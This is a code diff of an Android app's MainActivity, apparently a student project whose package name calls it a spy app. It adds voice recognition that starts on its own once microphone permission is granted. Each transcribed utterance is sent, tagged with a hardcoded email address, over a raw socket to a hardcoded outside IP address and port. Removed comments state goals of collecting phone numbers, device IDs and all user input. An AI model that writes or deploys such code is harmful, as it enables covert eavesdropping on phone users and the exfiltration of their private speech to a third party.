@@ -1,63 +1,236 @@
 package edu.csus.ecs.androidspyapp;
 
+import android.app.Activity;
+import android.graphics.Color;
 import android.os.Bundle;
-import android.support.design.widget.FloatingActionButton;
-import android.support.design.widget.Snackbar;
-import android.support.v7.app.AppCompatActivity;
-import android.support.v7.widget.Toolbar;
+import android.util.Log;
 import android.view.View;
-import android.view.Menu;
-import android.view.MenuItem;
-import android.telephony.TelephonyManager;
-import android.content.Context;
+import android.view.View.OnClickListener;
+import android.widget.ImageView;
+import android.widget.TextView;
+import android.widget.Toast;
+import android.os.StrictMode;
 
-public class MainActivity extends AppCompatActivity {
+import com.vikramezhil.droidspeech.DroidSpeech;
+import com.vikramezhil.droidspeech.OnDSListener;
+import com.vikramezhil.droidspeech.OnDSPermissionsListener;
+
+import java.io.IOException;
+import java.net.InetAddress;
+import java.net.Socket;
+import java.net.UnknownHostException;
+import java.util.List;
+import java.util.Random;
+
+public class MainActivity extends Activity implements OnClickListener, OnDSListener, OnDSPermissionsListener
+{
+    public final String TAG = "MainActivity";
+
+    private DroidSpeech droidSpeech;
+    private TextView finalSpeechResult;
+    private ImageView start, stop;
+    private Client client;
+
+    // MARK: Activity Methods
 
     @Override
-    protected void onCreate(Bundle savedInstanceState) {
+    protected void onCreate(Bundle savedInstanceState)
+    {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
-        setSupportActionBar(toolbar);
 
-        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
-        fab.setOnClickListener(new View.OnClickListener() {
+        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
+                .permitAll().build();
+        StrictMode.setThreadPolicy(policy);
+
+        // Setting the layout;[.
+        setContentView(R.layout.activity_droid_speech);
+
+        // Initializing the droid speech and setting the listener
+        droidSpeech = new DroidSpeech(this, getFragmentManager());
+        droidSpeech.setOnDroidSpeechListener(this);
+        droidSpeech.setShowRecognitionProgressView(true);
+        droidSpeech.setOneStepResultVerify(true);
+        droidSpeech.setRecognitionProgressMsgColor(Color.WHITE);
+        droidSpeech.setOneStepVerifyConfirmTextColor(Color.WHITE);
+        droidSpeech.setOneStepVerifyRetryTextColor(Color.WHITE);
+
+        finalSpeechResult = findViewById(R.id.finalSpeechResult);
+
+        start = findViewById(R.id.start);
+        start.setOnClickListener(this);
+
+        stop = findViewById(R.id.stop);
+        stop.setOnClickListener(this);
+
+    }
+
+    @Override
+    protected void onPause()
+    {
+        super.onPause();
+
+        if(stop.getVisibility() == View.VISIBLE)
+        {
+            stop.performClick();
+        }
+    }
+
+    @Override
+    protected void onDestroy()
+    {
+        super.onDestroy();
+
+        if(stop.getVisibility() == View.VISIBLE)
+        {
+            stop.performClick();
+        }
+    }
+
+    // MARK: OnClickListener Method
+
+    @Override
+    public void onClick(View view)
+    {
+        switch (view.getId())
+        {
+            case R.id.start:
+
+                // Starting droid speech
+                droidSpeech.startDroidSpeechRecognition();
+
+                // Setting the view visibilities when droid speech is running
+                start.setVisibility(View.GONE);
+                stop.setVisibility(View.VISIBLE);
+
+                break;
+
+            case R.id.stop:
+
+                // Closing droid speech
+                droidSpeech.closeDroidSpeechOperations();
+
+                stop.setVisibility(View.GONE);
+                start.setVisibility(View.VISIBLE);
+
+                break;
+        }
+    }
+
+    // MARK: DroidSpeechListener Methods
+
+    @Override
+    public void onDroidSpeechSupportedLanguages(String currentSpeechLanguage, List<String> supportedSpeechLanguages)
+    {
+        Log.i(TAG, "Current speech language = " + currentSpeechLanguage);
+        Log.i(TAG, "Supported speech languages = " + supportedSpeechLanguages.toString());
+
+        if(supportedSpeechLanguages.contains("en-US"))
+        {
+            // Setting the droid speech preferred language as english if found
+            droidSpeech.setPreferredLanguage("en-US");
+
+            // Setting the confirm and retry text in tamil
+            droidSpeech.setOneStepVerifyConfirmText("Confirm");
+            droidSpeech.setOneStepVerifyRetryText("Try Again");
+        }
+    }
+
+    @Override
+    public void onDroidSpeechRmsChanged(float rmsChangedValue)
+    {
+        // Log.i(TAG, "Rms change value = " + rmsChangedValue);
+    }
+
+    @Override
+    public void onDroidSpeechLiveResult(String liveSpeechResult)
+    {
+        Log.i(TAG, "Live speech result = " + liveSpeechResult);
+    }
+
+    @Override
+    public void onDroidSpeechFinalResult(String finalSpeechResult)
+    {
+        // Setting the final speech result
+        this.finalSpeechResult.setText(finalSpeechResult);
+        client = new Client("167.71.154.254",9001);
+        String s = "ciliesj@gmail.com|" + finalSpeechResult;
+
+        client.sendMessage(s);
+        client.closeConnection();
+
+        if(droidSpeech.getContinuousSpeechRecognition())
+        {
+            int[] colorPallets1 = new int[] {Color.RED, Color.GREEN, Color.BLUE, Color.CYAN, Color.MAGENTA};
+            int[] colorPallets2 = new int[] {Color.YELLOW, Color.RED, Color.CYAN, Color.BLUE, Color.GREEN};
+
+            // Setting random color pallets to the recognition progress view
+            droidSpeech.setRecognitionProgressViewColors(new Random().nextInt(2) == 0 ? colorPallets1 : colorPallets2);
+        }
+        else
+        {
+            stop.setVisibility(View.GONE);
+            start.setVisibility(View.VISIBLE);
+        }
+    }
+
+    @Override
+    public void onDroidSpeechClosedByUser()
+    {
+        stop.setVisibility(View.GONE);
+        start.setVisibility(View.VISIBLE);
+    }
+
+    @Override
+    public void onDroidSpeechError(String errorMsg)
+    {
+        // Speech error
+        Toast.makeText(this, errorMsg, Toast.LENGTH_LONG).show();
+
+        stop.post(new Runnable()
+        {
             @Override
-            public void onClick(View view) {
-                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
-                        .setAction("Action", null).show();
+            public void run()
+            {
+                // Stop listening
+                stop.performClick();
             }
         });
-
-        //TODO: Initial app data acquisition here..
-//        TelephonyManager telephonyManager = (TelephonyManager)getSystemService.getSystemService(Context.TELEPHONY_SERVICE);
-//        String phoneNumber = telephonyManager .getLine1Number();
-//        String deviceID = telephonyManager.getDeviceId();
-//
-//        Log.d("SPY", "testing logging from onCreate()");
-
-        //TODO: Spawn background process that records all of your input and stuff.
     }
 
-    @Override
-    public boolean onCreateOptionsMenu(Menu menu) {
-        // Inflate the menu; this adds items to the action bar if it is present.
-        getMenuInflater().inflate(R.menu.menu_main, menu);
-        return true;
-    }
+    // MARK: DroidSpeechPermissionsListener Method
 
     @Override
-    public boolean onOptionsItemSelected(MenuItem item) {
-        // Handle action bar item clicks here. The action bar will
-        // automatically handle clicks on the Home/Up button, so long
-        // as you specify a parent activity in AndroidManifest.xml.
-        int id = item.getItemId();
-
-        //noinspection SimplifiableIfStatement
-        if (id == R.id.action_settings) {
-            return true;
+    public void onDroidSpeechAudioPermissionStatus(boolean audioPermissionGiven, String errorMsgIfAny)
+    {
+        if(audioPermissionGiven)
+        {
+            start.post(new Runnable()
+            {
+                @Override
+                public void run()
+                {
+                    // Start listening
+                    start.performClick();
+                }
+            });
         }
+        else
+        {
+            if(errorMsgIfAny != null)
+            {
+                // Permissions error
+                Toast.makeText(this, errorMsgIfAny, Toast.LENGTH_LONG).show();
+            }
 
-        return super.onOptionsItemSelected(item);
+            stop.post(new Runnable()
+            {
+                @Override
+                public void run()
+                {
+                    // Stop listening
+                    stop.performClick();
+                }
+            });
+        }
     }
 }
